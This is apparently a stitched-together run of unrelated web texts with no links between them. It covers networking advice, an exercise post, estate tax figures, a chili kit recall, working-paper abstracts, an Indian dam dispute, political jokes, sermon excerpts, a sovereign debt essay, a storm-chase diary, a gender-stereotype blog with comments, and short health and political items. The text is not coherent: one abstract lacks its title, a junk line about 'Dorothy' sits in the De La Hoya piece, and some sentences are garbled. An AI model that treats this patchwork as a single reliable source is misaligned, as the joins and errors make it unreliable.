Although, this is about giving the gift of your name to others, it certainly runs a close second in importance to "Whats' in a name?"What is giving the gift of your name? Giving the gift of your name is when you see someone you haven't seen in a while and you are kind enough to give (remind) him or her your name (the gift) again without any hesitation.It's not nice to keep someone guessing about your name.
Which Networking Events Should You Attend?
How does one determine which are the best events to attend based on one's best customer?Customers are not a dime a dozen, especially in today's economy. So it is best to follow the rules mentioned before on how to define your best customer before attending an event.
Follow-Up with Your Contacts
What happens when you meet a potential client at an event and you do not follow up?So now the event is over and you have collected a number of business cards, taken notes on the best prospects, divided the cards into Y(es), N(o), and M(aybe), now what? It is time to follow up. The best follow-up is immediate - they will remember you best if you go home that night and enter their information into your database and send a personal email or hand-written note.
Defining a Quality Networking Group
When it comes to quality, how do you choose the group that matches your expectations?Defining a quality group is not as easy as it looks. You first need to conduct the research into meetings, type of attendance etc.
Ask for What YOU Want and Gain More Business
Why ask others for help and what do you gain from it?What does asking for help have to do with creating business relationships and making announcements? It has everything to do with it. You have made announcements, donated items, created an awareness of who you are and what you do.
Practice Makes Pefect
What is the problem when people try to describe what they do and they stumble over their words and never consistently repeat the same message?Have you ever gone to a networking event and the person next to you is trying to describe what they do and they keep miscuing the words? This happens so often at these events. The major problem, besides focus, is the fact that they have not practiced their spiel.
Plan for the Event or Flounder
Rather than being there to eat the food and drink the drinks, planning before attending an event will change your view.Have you ever attended an event and seen all the people gravitating towards the food and the drinks? That is the first thing people seem to go for.
How to Collect Business Cards
Why the business card grab is not why you are there? So how do you obtain the card and show interest that gains confidence?One of the things I am also always asked is, "How do you collect cards?" and "What do you do with them when you get them back to the office?" What really happens when you collect business cards? Often they get put into a pocket with many others. Have you ever collected cards to later find out that you have no idea who the person was? This happens all the time.

Family Relationships
Family can be loving and supportive in certain times but they can also be the most challenging and aggravating experiences of our lives. We think we understand and know our family members but that can be because they are the people who formed our first understanding of how to relate to the world. Family loves us but they also installed the buttons that triggers us. Family can be the Yin and the Yang of life, they can create opportunities for wonderful joy as well as occasional deep pain. When those more painful times come, it is often helpful to turn to a professional that can help you threw this difficult time.
What is Family Therapy?
Family therapy helps families or individuals within a family understand and improve the way family members interact with each other and resolve conflicts. Family therapy is usually provided by therapists known as marriage and family therapists. These therapists provide the same mental health services as other therapists, simply with a specific focus — family relationships. Family therapy is often short term. You usually attend one session a week, typically for three to five months. In some cases, though, families may need more intensive treatment. The treatment plan will depend on your family's specific situation.

Benefits of Aerobic Exercise
September 16, 2017 | No Comments | fitness
The real benefits of aerobic exercise are achieved by increasing your heart rate and breathing hard for an extended period of time. During this aerobic activity your body produces more energy and delivers more oxygen to your muscles. Your heart beats faster and increases the blood flow to your muscles and then back to your lungs.
Aerobic means "with oxygen" and your body's aerobic system is your heart, lungs, blood vessels and muscles. The benefit of aerobic exercise is based on how well your body can deliver oxygen to your muscles and use it for energy. Regular aerobic workouts increase your ability to take in and transport that oxygen and improves your aerobic capacity.
A good aerobic exercise program can help you live a longer, healthier life and enhance your well being. You get a multitude of benefits if you do your aerobic workout on a regular basis even if the intensity is low or short in duration. It's fun to keep a log of your workouts that track your progress to see how far you have come in your pursuit of fitness.
The bottom line is to start an aerobic workout that you enjoy and look forward to doing on a consistent basis. Aerobic activity is fun and it does not require a lot of concentration. So listen to music, watch TV or listen to educational tapes while you are performing your aerobic exercise program.
Aerobic workouts make you feel better about yourself so you can enjoy life more. It boosts your mood, strengthens your heart muscle, helps you maintain your weight and can even lower your blood sugar levels. It can help increase your stamina and help you manage stress. A session of aerobic activity can help you relax after a stressful day at work. It can even improve your sexual performance.
If you maintain a regular aerobic exercise program as you get older, your muscles will stay stronger and help you avoid fractures and falls. This will help keep you independent and on your own longer. People who engage in exercise and cardiovascular fitness appear to live longer than those who do not.
Aerobic activity comes in many forms and you can benefit from the time you spend in doing them. The benefits of aerobic exercise are good for your body and your mind and will help to make you live longer, stay healthy and feel great.

Happy New Year – 2019 Estate & Gift Tax
Happy New Year!
Now, time to talk taxes! The 2019 tax changes are:
The Estate and Gift tax exemption rate is increased (adjusted for inflation) to $11.4 Million per individual in 2019. This is an increase from $11.18 Million per individual in 2018.
Planning together, in 2019, married couples can transfer a total of $22.8 Million in inheritance or gifts without paying gift or estate tax (subject to prior use of the credit).
The annual gift exclusion amount is unchanged from 2018. It remains at $15,000.
Remember, the tax law that ushered in these increased Federal Estate Tax exemption amounts expires at the end of 2025. Talk with your accountant or attorney to see if you could benefit from taking steps before 2026 to utilize the tax exemption.

Toss These Hunt's Product If You've Got Them In Your Pantry - Pronto
By: Clayton Browne | April 14, 2017
FB TW PN
Food recalls due to E Coli and Salmonella contamination are increasingly common today. There are a number of reasons for this serious and growing problem, but the overuse of antibiotics in the livestock industry is certainly a big part of the problem.
As a recent example of this trend, Conagra Brands, Inc., announced on April 2nd that it is voluntarily recalling a select large Hunt’s Chili Kits due to the possibility of Salmonella in the chili seasoning packet that comes with the kit. The chili seasoning in the packet comes from a supplier who informed Conagra of the possible presence of Salmonella in a raw material of the chili seasoning.
Note that no Salmonella was found in any of the finished product supplied to Conagra Brands, but the company has decided to recall the product to be 100% certain that no one gets sick.
No reports of problems related to consumption of this product have been made so far. Keep in mind that Salmonella is a bacteria that typically results in diarrhea, fever and abdominal cramps in humans.
Most individuals recover without the need for hospitalization or drugs. The diarrhea may be so severe, however, that the patient must be hospitalized. Senior citizens, babies and babies with impaired immune systems are more likely to suffer a severe infection.
Note that this canned food product as distributed in retail stores, military commissaries and online throughout the US. The product code information identifying the recalled items can be seen on the underside of the kit below the barcode.
No other products are impacted by the recall of the chili kits.
The FDA advises consumers to not eat the product if they bought it, but instead return it to the store where they bought it.
Conagra Brands is cooperating fully with the FDA on this recall, and is working diligently to make sure that all potentially contaminated products are removed from store shelves and are not sold or consumed.

1. South Koreans see Improved Security, Confident in US Security Guarantee
Author: Dina Smeltz
Publication Date: 01-2019
Content Type: Working Paper
Institution: Chicago Council on Global Affairs
Abstract: Over the past 12 months, there have been more discussions between South Korean, US, and North Korean officials about Pyongyang’s potential denuclearization than at any time since the Six-Party Talks in 2006 and 2007. Exactly where those discussions are headed is unclear. But in South Korea, the public generally sees an improvement in the South Korean security situation according to a just-completed Chicago Council on Global Affairs survey. As a result, support for South Korea developing its own nuclear weapon appears to have waned, though a slight majority remains in favor. Despite what seems to be a slight sense of relief, the South Korean public is skeptical that either Moon or Trump can convince Kim Jong Un to fully denuclearize

3. Trumps First Year at the Helm
Author: Ville Sinkkonen, Mika Aaltola
Publication Date: 01-2018
Content Type: Working Paper
Institution: The Finnish Institute for International Affairs
Abstract: Donald Trump’s first year as President has been marked by continuity in US security policy, a partial challenge to the global principles of free trade, and a sea change in commitments to the liberal international order. These reflect a view of the international system as a zero-sum competitive realm.

5. Toward data driven education systems
Author: Samantha Custer, Elizabeth M King, Tamar Manuelyan Atinc, Lindsay Read, Kabir Sethi
Publication Date: 02-2018
Content Type: Working Paper
Institution: The Brookings Institution
Abstract: Today, 650 million children around the globe are at risk of being left behind as they fail to learn basic skills. Inequitable access to education is part of the problem, but even when children are in school, they may not be learning. In Uganda, for instance, barely half of grade 6 children read at a grade 2 level (Uwezo, 2016). In India, just one in four children enrolled in grade 5 can read a simple sentence or complete simple division problems (ASER Centre, 2017).

Publication Date: 02-2018
Content Type: Working Paper
Institution: Danish Institute for International Studies
Abstract: Disagreements on how to define “autonomy” are stalling formal UN discussions on the compliance of autonomous weapons with international humanitarian law. A pragmatic approach that focuses on the weapon’s critical functions, such as target selection and firing, can help move discussions forward in the future.

8. Constrained Potential: A Characterisation of Mexican Microenterprises
Author: Ana Karen Negrete-García
Publication Date: 01-2018
Content Type: Working Paper
Institution: German Institute of Global and Area Studies
Abstract: This paper investigates the existence and nature of constraints prevailing among Mexican microenterprises. It provides inter‐temporal insights by relying on firm‐level data span‐ning from 1994 to 2012. A performance index is defined based on firm levels of capital stock and monthly profits, and is used to estimate the empirical probability of a business’s success. The predicted values are used to classify every microenterprise into one of three categories: upper, middle, or lower segment. Overall, the study provides evidence of con‐ strained productivity and capital misallocation. Specifically, middle‐segment firms exhibit entrepreneurial features and their average marginal returns are 15 percent. Because this segment faces mainly external constraints, cost‐effective interventions are plausible. Re‐garding the lower‐segment firms, it is estimated that their average monthly marginal re‐ turns are 30 per cent, compared to 1 per cent for the upper segment. It is also shown that, over time, the share that middle‐segment firms represent relative to all microenterprises increased from 16 to 22 percent. Lastly, the sources of variation in monthly profits among segments are explored using the Oaxaca‐Blinder decomposition method.

9. Who Protects Whom? Politicians, Police and the Regulation of Drug Trafficking in Argentina
Author: Hernan Flom
Publication Date: 01-2018
Content Type: Working Paper
Institution: Kellogg Institute for International Studies
Abstract: In many developing countries with weak formal institutions, sectors within the state protect organized criminal activities, allowing illicit markets to thrive. This article posits that how state actors regulate drug trafficking affects the levels of violence associated with such criminal activity. I argue that political competition influences coordination within the police and leads to different types of regulatory regimes. On the one hand, coordinated forces implement protection rackets that contain violence. On the other, uncoordinated police carry out particularistic negotiations with drug traffickers that exacerbate criminal violence. I illustrate this argument with a subnational comparison of two Argentine provinces, Buenos Aires and Santa Fe, during a period in which both witnessed a surge in drug trafficking but only one (Santa Fe) suffered a dramatic increase in criminal violence. These cases show how corrupt states can obtain relative order in highly fragmented drug markets, and how the police shape the evolution of drug dealing in metropolitan areas.

10. The Role of Local Governance in Sustaining Peace
Author: Alain Tschudin, Albert Trithart
Publication Date: 02-2018
Content Type: Working Paper
Institution: International Peace Institute
Abstract: While the importance of good governance to sustaining peace is widely recognized, the focus tends to be on national governance. This overlooks the crucial role of local governance actors, particularly when the central government is fragmented or lacks broad legitimacy. These actors include not only formal institutions like municipal governments but also a mix of other actors that could range from traditional chieftaincies to community-based organizations to religious institutions.

Thoothukudi farmers doubt Tamil Nadu government's intention

142-yearold Srivaikundam dam being the last one in the Thamirabarani irrigation system
Srivaikundam dam
Thoothukudi: The farmers of Thoothukudi “doubt the intention” of the Tamil Nadu government in de-silting the Srivaikundam dam in the district as they complained the state was yet to release a government order (G.O.) to officially take up the work.
The 142-yearold Srivaikundam dam being the last one in the Thamirabarani irrigation system in Thoothukudi district has not been desilted for more than 50 years continuously and hence the dam suffered erosion in its storage capacity of 8 ft due to the formation silt.
While farmers in the Srivaikundam region placed repeated demands to successive state governments for long in this regard, the government had assured to fulfill their demand. Following this, the PWD had sent a proposal to the government that was positively considered. However, the Union ministry of environment and forests that holds 100-year lease on 96.6 acres, delayed permission to take up the de-siltation project at the dam.
The Union ministry’s delay brought in the Thoothukudi district MDMK into the scene and the party’s district secretary, advocate Joel, filed a case at the green tribunal seeking a direction in favour of the farmers’ demand.
The green tribunal last month in its order insisted the Union ministry of environment and forests to give immediate clearance and added that if the Central ministry delayed, the tribunal had instructed the Tamil Nadu government to take up the project. The Union ministry however, gave its clearance immediately, after which the PWD had taken up the project.
Nonetheless, Nainar Kulasekaran, convenor of Thamirabarani river water protection, said the government is yet to issue a formal order without which the work could be stopped any time. The farmers of Srivaikundam have also raised doubts over the government’s intention as neither the PWD nor the district collector, who jointly prepared the proposal, are yet to make public the information about how much of sand is to be mined to desilt the dam.

Jewish World Review July 26, 2016
The News in Zingers
By Argus Hamilton
http://www.JewishWorldReview.com | • The Democratic convention's opening day prayer Monday was interrupted by furious Bernie Sanders supporters who chanted Bernie's name over the minister's prayer. This group has no sense of humor at all. Jokes about socialism are not funny unless the government says they're funny.
• The Democratic convention broke out in open floor fights between Bernie Sanders supporters and angry Hillary supporters on the floor. Her election is by no means guaranteed in November. With state after state voting to legalize pot, Democrats are worried they might not get up in time to vote.
• California firefighters battled a blaze in the Santa Clarita Valley Saturday that created a huge smoky cloud hovering over Los Angeles. The sun was reduced to a bright orange ball over the city which mesmerized drivers and sunbathers. Democrats charged it was just more free media for Trump.
• Mexican president Enrique Nena Piete arrived in Washington D.C. Friday to begin his official state visit to the White House. He later embarked on a tour of several U.S. cities. He wasn't in the United States for three hours before Homeland Security admitted they've completely lost track of him.
• The Pokemon Go craze had Millenials walking off cliffs, straying into bad neighborhoods and into traffic this week as they followed smartphone directions to capture the icons. Thanks goodness for the app. Americans were almost at risk of having to pay attention to what's going on in the world.
• Democratic delegates began arriving in Philadelphia Sunday for their convention at the city's Omni Center this week. Yesterday's welcoming luncheon for state delegations said it all. Hillary Clinton called Donald Trump a threat to democracy, and the super-delegates all stood up and cheered.
• President Obama hosted Mexico's president Enrique Nena Piete at the White House Friday to hail U.S.-Mexico relations. It is part of an annual exchange. Once a year, America's president goes to Mexico to visit our jobs and once a year Mexico's president comes to the U.S. to visit his people.
• The Republican convention released one hundred and twenty-five thousand balloons to end the convention Thursday. It's a bipartisan tradition. The Democrats will also release one hundred and twenty-five thousand balloons this Thursday, but theirs will be ribbed for comfort and protection.
• Bill Clinton will give a speech at the Democratic convention tonight that focuses on Hillary's career. He always makes a convention more fun. Last night, Bill Clinton walked into the hotel bar in Philadelphia where he asked the waitress for the usual, so she brought him a restraining order.
• Massachusetts Senator Elizabeth Warren was added to the list of Democrats who will address the Democratic Convention this week in Philly. They need to be very careful. No one is sure what Elizabeth Warren's play-on music will be, but if it's Hail to the Chief, the Cherokees may declare war.
• Donald Trump's GOP convention speech in Cleveland Thursday drew a seventy-five percent approval rating in a tracking poll. Liberals sounded the alarm. Democrats believe as an article of faith that pot gives you the munchies, cocaine gives you the thirsties and Trump gives you the Nazis.
• The NFL will insert a computer chip inside footballs as a way of tracking how many field goal attempts would be missed this year if goalposts were narrowed. The chip will show precisely how it'd affect scores. The NFL team hasn't even moved to Las Vegas yet and already they're counting cards.
• Johnny Manziel apologized with a note, a carafe of orange juice and a bottle of champagne after he slugged a guy at a wedding dinner last week. There's still hope for him. During the early eighties, I went to rehab so often that my caricature is on the wall at the Betty Ford Center Cafeteria.

The Double-Dog Dare Days of August
August’s lazy, hazy dog days quickly became a deadly double-dog dare contest between President Donald Trump and Kim Jong-Un, the supreme leader of North Korea. Both nations have been at odds with each other for nearly 70 years. During his working golf vacation in New Jersey last week, President Trump responded to North Korea’s rhetorical sword-rattling by launching a verbal preemptive strike of his own.
Call it the Bedminster bombast, or the putt that rocked Pyongyang. But the duel between the two countries is more than fodder for late-night comedians. It’s a deadly standoff with history-changing repercussions.
There is no vacation from matters of national security, or the orations of war. Indeed, much of the war of words between Washington and North Korea seems to confirm Jesus’ counsel in Matthew: “It is not what goes into the mouth that defiles a person, but it is what comes out of the mouth that defiles.” The contrasts between these barbed exchanges and the biblical understanding of peacemaking offers an intriguing opportunity to hear Jesus’ words in a world filled with double-dog (and even triple-dog) dares....more
Feeding The 5,000
The assigned Gospel text for this week skips over a couple of sections in Matthew's story. Matthew 14:34-36 cites Jesus' journey to Gennesaret. The crowds of people recognized him immediately and all of the sick came to him for healing. Just a touch of Jesus' garment brought healing to many. The crowd in Gennesaret recognized Jesus. They came to him in their need....more

Religious balkanization
One dimension of religious life we have in common across faith traditions and denominational lines is the incessant divisiveness that split our seemingly monolithic communities into dozens of similar yet tenaciously varied subgroups. A Jewish professor of psychology said of his tradition, "If there are ten Jewish males in a city we create a synagogue. If there are eleven Jewish males we start thinking about creating a competing synagogue."...more

Jesus Is Coming, Look Busy
Isaiah 56:1, 6-8
I had a parishioner who would walk out of the sanctuary if he saw a djembe (African drum) out in front to be used in worship. I asked him about it, in a wonderfully pastoral manner, and he told me that things like that didn’t belong in worship. I said that it was in the bible to praise God with pipes and drums (I think it is). He told me he didn’t care what the Bible said, he knew where that thing came from and he wouldn’t have it. I asked him why things from Africa would bother him. He told me that he knew I was liberal but that didn’t mean he had to be. I agreed with him but cautioned him that racism was probably one of the worst examples of evil in our world and I thought he should consider what Christ would think of that. He asked me who paid my salary, Christ or good Americans....more

No Strings Attached
In today's gospel reading, Jesus seemed reluctant to heal the Canaanite woman's daughter. He told her that he wasn't sent to help foreigners, but only his own people, the Chosen Race. The words sound unnecessarily harsh, but perhaps this is an interpretation unique to Matthew, for this story only appears in Matthew's gospel, which was written for Jews....more

Great Faith
Object: Hula Hoop or circle made out of ribbon, twine or rope
What an amazing morning to come to church today. I am so glad to see you and talk to you about a wonderful story from the bible. Let me begin by showing you this circle. Now let's get into this circle. (Physically, all move into the circle) It's fun for us all to be together in this circle. We don't want anyone to be left out. To be left out is to be sad. To be kept out is even more sad and painful....more

Oscar De La Hoya looks on after the WBC featherweight title bout between Gary Russell Jr. and Joseph Diaz Jr. Photo by Scott Taetsch/Getty Images
By Remezcla Estaff | 2 days ago
Wild things happen in politics all the time – and that’s what Oscar De La Hoya hopes will push him to the presidency. The Mexican-American boxer announced his plans to run and challenge President Donald Trump in 2020.
Multi color color Dorothy Dorothy Multi color Multi Dorothy Dorothy
“That’s the beauty of our nation,” he said, according to El Paso Times. “If Arnold (Schwarzenegger) can be governor, if (Donald) Trump can be President, then why can’t a Mexican-American who won an Olympic gold medal, who’s over 35 and a US citizen, run for presidency?”
ODLH confirmed the news (“It’s real,” he said) after rumors surfaced that he was getting ready to run for public office. He didn’t delve into his vision or any other details about running, but we’re certain that someone as beloved as ODLH will likely attract at least decent support. He already has the backing of former Mexican president Vicente Fox. “You are honored and respected all over the world. You are well known in California, supported by all which you’ve done,” he said, according to TMZ. “You are a fighter. You are a warrior. You do fight for human rights. You do protect and fight for Hispanics and Mexican Americans rights in the United States … that’s you, Oscar.”
Apparently, though, it’s not a decision Oscar arrived at impulsively. He’s thought of running for years, especially after many have tried to encourage him to seek public office.

“As I got older, I get wiser and as I get wiser, I get smarter and as I get smarter, I start to realize the millions and millions of people who’ve told me, ‘Oscar, why don’t you run for some kind of office? Because you can make a difference.'”

Sovereign Debt Crises- for China's People's Daily.
Ann Pettifor
June 15, 2015
First Published in China's People's Daily on 29 May, 2015
Sovereign debt can be uniquely complex, from both a financial and political perspective. It is covered by private law, yet there is no international law equivalent to insolvency law for sovereign states. Unlike individual and corporate debtors, who can appeal to the law of bankruptcy to draw a line under their debt, the citizens of poor countries remain infinitely liable for debts incurred by their governments. This is the case even if their exchange rate has collapsed and the debt has a far higher value than when incurred.
There are welcome recent efforts by the G77 and China to put in place a fair international process for sovereign debt crisis resolution. By contrast, the IMF is pursuing a far more limited path of improving the technical wording of bonds, to enable collective action clauses that enforce organized write-down or restructuring of debt more easily. While making some improvements, this does not resolve the root problem.
Underlying most recent sovereign debt crises is the fact that, under today’s global financial architecture, there is no adequate management of exchange rates and of cross-border capital flows. These footloose, de-regulated and often short-term speculative flows encourage excessive borrowing, reckless lending and risk-taking. With increased regularity they cause financial crises.
Greece and Ukraine
At a time of rising geopolitical tensions, two European sovereign debt crises are adding to global economic and financial instability. The crisis in Greece exposes a deepening divergence within the European Union, and that in Ukraine has opened a dangerous gulf between western states and Russia.
While Ukraine’s total external debt is (optimistically) projected to peak at 158% of GDP in 2015,[1] Greece’s €312bn debt represents nearly 175% of the country’s 2014 GDP. [2] Most of Greece’s debt is now owed to official creditors: the European Union, the European Central Bank and the IMF. Ukraine’s external debt is largely owned to private creditors, with a significant debt owed to Russia.
Recently Ukraine’s parliament voted to grant the government power to stop foreign debt payments to both private and official creditors. This implies that Ukraine may default on a $3bn bond obtained from Russia because - according to the parliament – this and other debts incurred by the previous government of Viktor Yanukovich were “odious” and “wasted in vain”.
As I write, Greece is still in protracted, painful negotiations with her official creditors. The country is desperately short of funds, and her Finance Minister, Yanis Varoufakis, has accused Europe’s creditor powers of “trying to force his country to its knees by ‘liquidity asphyxiation’”. There appears to be a very real chance that Greece will involuntarily default, and in so doing exit the Eurozone.
A Greek exit from Euro could have a wider destabilizing impact on global capital markets. As Mr. Varoufakis argued recently in Washington: “The euro is fragile, it’s like building a castle of cards. If you take out the Greek card the others will collapse.”
Argentina and the US Legal System
The case of Argentina highlights major problems under the current non-system. After a disorderly default in 2001/2 due to economic collapse, Argentina negotiated a ‘haircut’ of 70% of the debt with over 90% of her creditors.
Less than 10% of creditors, the “hold-outs” including some notorious ‘vulture funds’ declined to accept this deal. The latter are speculative investors that buy up sovereign debt on secondary capital markets at, say, 20 cents in the dollar and then use aggressive US legal techniques to get 100% payment on the debt - plus compound interest.
Argentina refused to pay the excessive demands of the vulture funds. Argentine bonds were, however, issued under New York law and American courts then interpreted the standard terms of the vulture funds’ bonds in a way that overturns long accepted international understanding of the law. This interpretation favours a small group of billionaire vulture funds over Argentina - and its people – as well as other creditors.
In addition, US courts extended the long arm of American extra-territorial law enforcement to ban any payments to the ‘haircut’ creditors, unless the vulture funds are paid 100% of the face value of the bonds - plus compound interest!
This is a highly unjust legal result with strong political undertones.
What is the cause of sovereign debt crises?
Since the 1960s, the gradual de-regulation of international capital markets has led to excessive lending and borrowing across borders by both private and official creditors and debtors. This frequently culminated in sovereign debt crises.
Sovereign debt differs in many ways from private debts. Investors that lend to countries normally face few risks, as governments can normally draw on predictable income from taxation and exports to repay debts. On the other hand, private investors do not have recourse to a fair, international legal framework if a sovereign debtor defaults.
Sovereign government debtors also face risks, not limited to public debt. Private corporate and individual borrowers may take on too much foreign currency debt, exposing the government, the central bank and ultimately innocent taxpayers or citizens to risk. Exchange rate movements can increase (as well as decrease) the cost of debt to be repaid in foreign currency.
What we can do to guard against debt crises?
The G77 and China group of states have played an important role in putting sovereign debt resolution, and reform of the international financial architecture, on the high-level international agenda. In June 2014, at the group’s 50th anniversary session in Bolivia, The Declaration of Santa Cruz, called for
“reform of the international financial architecture so that we have a financial and monetary system that reflects the realities of the twenty-first century, including a properly regulated international financial sector that reduces and discourages speculative investment, in order for capital markets to be mobilized to achieve sustainable development and play a constructive role in the global development agenda.”
It further called for
“an effective, equitable, durable, independent and development-oriented international debt resolution mechanism”.
This initiative was swiftly followed up at the UN. In September 2014, a General Assembly Resolution backed by the G77 and China (and overwhelmingly supported) called for “a multilateral legal framework for sovereign debt restructuring processes..” The UN noted that vulture funds “pose a risk to all future debt restructuring processes, for both developing and developed countries.”
However, the 11 votes against this Resolution include most of the main western creditors, so the struggle for a fair independent legal process will need to be sustained and determined.
If proper regulation of the international financial sector were to be put in place, and if such regulation were to be complemented by a “new international legal framework for sovereign debt restructuring” – then the world could begin to end the global imbalances between sovereign debtors and their creditors; limit sovereign debt crises, and restore global financial and economic stability and justice.
The absence of the discipline imposed by an international insolvency framework, encourages reckless lending and borrowing. At the same time this void in international law prevents the resolution of debt crises in ways that are fair to both debtor and creditors.
End.

Thousands of Foster Kids Receive Psychiatric Drugs Without Safeguards
Conversely, Kids Who Need Drugs Go Untreated
Thousands of foster children may be getting powerful psychiatric drugs prescribed to them without basic safeguards, according to a report released by the Health and Human Services (HHS) inspector general’s office. The report found that about 1 in 3 foster kids from a sample of states were prescribed psychiatric drugs without treatment plans or follow-up, standard steps in good medical care.
Foster kids are much more likely to receive psychiatric drugs than children overall. However, investigators also said that children who need medication to help them function at school and in social settings may be going untreated.
The inspector general is recommending that the HHS Administration for Children and Families develop a strategy to help states meet their current requirements for prescribing psychiatric drugs to foster children, and to generally raise standards for case-by-case oversight.
The federal government provides grants to state programs and also covers health care for foster children through Medicaid, which spends hundreds of millions of dollars annually on psychiatric drugs. It is estimated that 120,000 children in foster care take at least one psychiatric medication.

Day three of our storm chase adventures was just as much fun as the two previous days, although my wife didn't get to see a tornado. We left Carlsbad and headed north towards Roswell yesterday afternoon. Radar was already painting a nasty supercell thunderstorm south of US 70 near Sunset, in Lincoln County, that was moving off to the northeast. By the time we got to Artesia it had become a right mover, and had started turning to the east and eventually southeast. I decided to pull over on the Chaves/Eddy County Line and wait for this one to come to us since there were no good roads to take to this storm. We watched it until it got within about 15 miles of Artesia and then took a turn more to the east and moved across the Lake Arthur area.
Lots of mid-level rotation was observed on GRLevel3_2.00 with this storm. I remember seeing 116 knots of LLDV at one time which had a depth of around 24,000'. The largest hail icon I saw on radar was 2". Although we were never in the hail core and didn't see any hail from this storm. What we did see were a couple of small ragged wall clouds that had a hard time remaining persistent. They would come and go and never really maintain themselves for very long. Small scud clouds occasionally would get sucked up into the wall clouds and the rain free base. Only one wall cloud showed any signs of trying to rotate and that was very brief and it then became rain wrapped. A persistent rain foot was observed that lasted well over an hour.
A thunderstorm wind gust of 64 mph was measured at the 8 Mile Draw Raws at 4:37 PM MDT, which is located 14 miles north of the Bitter Lakes Wildlife Refuge.
Eventually the storm begin to weaken as its inflow was cutoff by thunderstorms to its south which were southwest-west of Artesia. So we headed back south towards Cottonwood where we encountered the outflow winds and blowing dust from these thunderstorms. At times the visibility dropped down to 1/4 to 1/2 of a mile in the blowing dust.
As we came into Artesia on our way back south to Carlsbad we hit some light to moderate rain, and it picked up to heavy at times until we reached Seven Rivers. It was good to see standing water in some of the pastures and a foot of water in the bar ditches. The rain pretty much ended after we got back home so after a quick bite to eat at Danny's we went up to C-Hill where I shot the photos of the Mamatus clouds.
A line of thunderstorms eventually formed from northeast of Artesia to southwest of Carlsbad and marched off to the east. There were several reports of straight line wind gusts of 60 mph, downed power lines in Lea County, as well as a tank battery fire.

Mystery Unresolved!!
Why girls are said to be complex characters? According to men, women are one of the most complex mysteries to solve. But why?? May be because they are unpredictable. Its very difficult to get into their minds and know what they are thinking and nobody can predict how they'll react over the things... Women are considered unknown by not even just men but by themselves too. However men and women both are two sides of the same coin. They are extreme opposites, yet they compliment each other.
The difference is great. And it seems a miracle to see them living together. But thats the thing that gives our lives a zing of different spices, hence adding a color and taste to it. Where girls are considered to be too fussy about keeping things right, guys are careless people, who never keep their things in right place. Guys feel proud being unorganised. Bedroom means Lots of mess around. Leaving wet towels on bed, chocolate wrappers on side tables, not putting shoes or clothes at the right place after coming home are some of the examples. Cupboard means whole world somehow packed inside a box, ready to fall out, if opened. And all this leads to minimum half hour lecture per mistake by the woman in their lives be it their mothers, wives or sisters.
It is said that a woman can understand a woman best and ironically a woman is the biggest enemy of another woman. Whereas in the case of men, One day they seem to be the biggest enemy of each other and the next day they'll be seen spending great good time with each other like good old friends. In case of ladies Fashion sometimes go over and above. Months are spent like days for shopping. on the other hand guys find it very irritating and try to end it up asap.
Interestingly a Boy Friend means lots of care, enquiry and per hour report of what he does the whole day and whom he met. whereas in case of men having Girl friends is status symbol. More the merrier.
Guys shows lots of attitude, aggression and style on road, while driving or between friends. Again they have a great good amount of ego. Like if they are lost on some route, they feel bad about asking the route from somebody. They'll first try their level best, and after failing they 'may' enquire about the place where they want to go. And ladies go real slow on road. At times its irritating to watch their level of patience on the road.
As per an old saying "its lucky to be the first love of a woman and last love of a man". I dunno how much truth is that. But yes both are very different from each other.
Yet at times i feel guys are somewhat unpredictable too. They want to know each and everything about a girl before commitment saying their past is irrelevant to them. Gimme a break!! If its true y the hell they ask abt it. and if they dont ask, and in future they got to hear something about them, they loose their temper. Guys can hardly forget the past of their ladies. They can't stand their wife's male friends yet they expect their ladies to understand them and be good and nice to their female friends. I guess may be thats y ladies prefer to be mysteries as they know their men!!
Or else God made them mysteries as they made men a mystery seeker, to hold that level of attraction and excitment in these adventurous souls... Women will always be a mystery unresolved!!

hey aditi,
i forgot to mention this point in my post but yes its like theres nothing like a perfect male or perfect female.. All men have a share of feminity in them and all women have a share of male qualities. (as per the indian theory of ardhanareshwar or chinese philosophy of yin yan.) Thats necessary for balancing the world. So here wt i have mentioned is an idealistic approach that more or less men possess these qualities and women are like that giving easier examples to understand it better. Anyhow i wanted to write so much i guess i have messed up here by including many topics at once.. lol
Ok here i must confess and give my example,as i said female gets irritated when men leave their towels on bed and leave geasers on..But I have this male bad habbit too.. lol and i at times drive aggressive on roads. Though i am trying hard to eradicate these habbits. So i have said wt is believed and is general not in particular..
Thanx btw. ;-)

Nobody can tell with 100% probability about how the other person is going to react about something. Ofcourse you can't get into another person's brain and decide how he or she will react.

oh really.. did i copy?
well as far as i knw you you never bother yourself with cleanliness not even 10%.
I am not predicting anything here. Well this is something i have observed from the people around. definitely ppl are diff but one kinda species have some common characterstics.. as like when you watch discovery channel, they talk about some common characterstics of specific kind of animals and how they react in diff situations. You see not every elephant will be happy and raise its trunk, when you caress it, there are ones who may get mad too.. and probably i didn't think abt myself while writing this post, thats why its unbais. And before commenting over something i guess you must follow prev. comments to keep the track with the things... chao!

Interesting read and seems lot of observation has gone in to writing it.. i would agree to the point that there are common traits but there are alwauys people who dont follow those traits..e.g i personally would never have ego in something as small as asking someone for directions. i believe once someone (guys as u say although i believe even gals show off ) is mature enough to understand that showing style on the road and in frens is just a showoff and doesnt actually mean anything.. they wld never do something like that.. so i guess its difficult to generalize these things to men or women of all age groups..
cheers

anyway jokes apart i guess a good point here.. but when we catagorise things over age, they'll become a bit more diff. i guess wt i have written is just a basic thought and not much detailed.. :)

I think girls are said to be complex beings perhaps because they have blood like all human beings and animals and blood contains haemoglobin which is complex compound of iron.
Am i right sis?

Tube Feeding Complications and Emergencies
Sarah Herrera
Product Specialist | Shield HealthCare
12/18/18 12:42 PM PST
Unforeseen events happen. And when it comes to a feeding tube, it is best to be prepared and stay calm. In the articles below, we discuss tips on how to handle matters that may come up while having a feeding tube such as painful and dislodged G-tubes, clogged tubing, and loss of power.
When using dry formula or medications through a feeding tube and you notice resistance when you try to take water or formula in, you may have a clog. Learn how to use warm water to loosed up the clog and clear the feeding tube.
In addition to being prepared for the everyday feeding tube process, it is important to be prepared for loss of power. If a severe storm, earthquake or other disaster occurs, you may not have electricity to keep your feeding pump running for longer than a few hours. In case of enteral feeding pump failure due to temporary power outage, you should have a backup plan such as gravity feeding (discuss with your doctor) to safely administer your feedings.

ERIE, Pa. — As Hurricane Michael pounded Florida on Wednesday, President Donald Trump took shelter at a campaign event in Pennsylvania, where he sought to boost Republicans before the midterms.
Trump acknowledged the hurricane at the top of his rally in Erie, offering his "thoughts and prayers" to those in the storm's path and promising to "spare no effort" in the response. He promised to travel to Florida "very shortly."
He added: "We will always pull through. ... We will always be successful at what we do."
